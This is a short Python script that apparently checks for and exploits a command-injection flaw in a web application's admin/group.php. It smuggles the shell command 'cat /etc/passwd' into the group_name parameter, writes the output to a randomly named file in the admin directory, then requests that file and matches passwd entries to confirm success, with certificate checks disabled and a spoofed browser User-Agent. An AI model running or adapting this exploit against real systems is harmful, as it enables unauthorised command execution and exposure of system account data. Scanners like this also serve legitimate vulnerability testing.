import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
fileName=randomLowercase(5)
def scan(baseurl):
	url=baseurl+f"admin/group.php?memberid=root&cmd=add&group_name=d;cat%20/etc/passwd>{fileName}.txt"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("window.open[(]\"menu02_02_m.php\",\"_self\"[)];",response.text):
		r0=True
	else:
		r0=False
	url=baseurl+f"admin/{fileName}.txt"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:.*?:[0-9]*:[0-9]*:",response.text):
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
